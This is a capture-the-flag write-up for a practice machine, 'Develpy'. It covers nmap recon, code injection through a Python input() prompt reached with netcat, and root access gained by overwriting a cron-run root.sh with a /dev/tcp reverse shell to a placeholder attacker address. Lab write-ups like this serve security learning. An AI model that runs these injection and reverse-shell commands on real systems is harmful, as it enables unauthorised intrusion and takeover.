# Develpy 

## Recon
`sudo nmap -sCV 10.49.175.34` 

```
PORT      STATE SERVICE           VERSION                                                                                                                                                                                                   
22/tcp    open  ssh               OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)                                                                                                                                                                                                                                                                           
10000/tcp open  snet-sensor-mgmt?           
| fingerprint-strings:          
|   GenericLines:
|     Private 0days          
|     Please enther number of exploits to send??: Traceback (most recent call last):                                                                                                                                                        
|     File "./exploit.py", line 6, in <module>                                                                                                                                                                                              
|     num_exploits = int(input(' Please enther number of exploits to send??: '))                                                                                                                                                            
|     File "<string>", line 0                                                                                                                                                                                                               
|     SyntaxError: unexpected EOF while parsing                                                                                                                                                                                             
|   GetRequest:                                                                                                                                                                                                                             
|     Private 0days                                                                                                                                                                                                                         
|     Please enther number of exploits to send??: Traceback (most recent call last):                                                                                                                                                        
|     File "./exploit.py", line 6, in <module>                                                                                                                                                                                              
|     num_exploits = int(input(' Please enther number of exploits to send??: '))                                                                                                                                                            
|     File "<string>", line 1, in <module>                                                                                                                                                                                                  
|     NameError: name 'GET' is not defined
|   HTTPOptions, RTSPRequest: 
|     Private 0days
|     Please enther number of exploits to send??: Traceback (most recent call last):
|     File "./exploit.py", line 6, in <module>
|     num_exploits = int(input(' Please enther number of exploits to send??: '))
|     File "<string>", line 1, in <module>
|     NameError: name 'OPTIONS' is not defined
|   NULL: 
|     Private 0days
|_    Please enther number of exploits to send??:
```

# Initial Access
- Connect to the service using netcat: `nc 10.49.175.34 10000`
- Obtain a reverse shell connection with the python command: `__import__('os').system('bash')`
- Captured user flag 

# Privilege Escalation

- The following files are present on the home directory of the user `king`: 

```
-rw-rw-r-- 1 king king      5 Mar 31 22:44 .pid
-rwxrwxrwx 1 king king    408 Aug 25  2019 exploit.py
-rw-r--r-- 1 root root     32 Aug 25  2019 root.sh
-rw-rw-r-- 1 king king    139 Aug 25  2019 run.sh
```
- The `exploit.py` script imports the `time` and `random` modules, printing the output seen from the nmap scan earlier. 

- The `run.sh` script kills `cat` that reads the process id of the user; runs `socat` to initiate a TCP connection with the service on port 10000 in order to run `exploit.py` and echoes the process id of the recently executed process into the `.pid` file. 
- The `root.sh` script runs any and all python scripts located on the directory `/root/company/media` 

- There are scheduled tasks or cronjobs present on the machine running every minute, which can be viewed with `cat /etc/crontab`

- Simply rename the `root.sh` script and create another `root.sh` file containing a reverse shell command: `sh -i >& /dev/tcp/<attacker-ip>/<attacker-port> 0>&1` 
- This creates a reverse shell connection back to your machine, and since the script is running every minute as root, this will allow a reverse connection as root. 

- Root flag obtained.
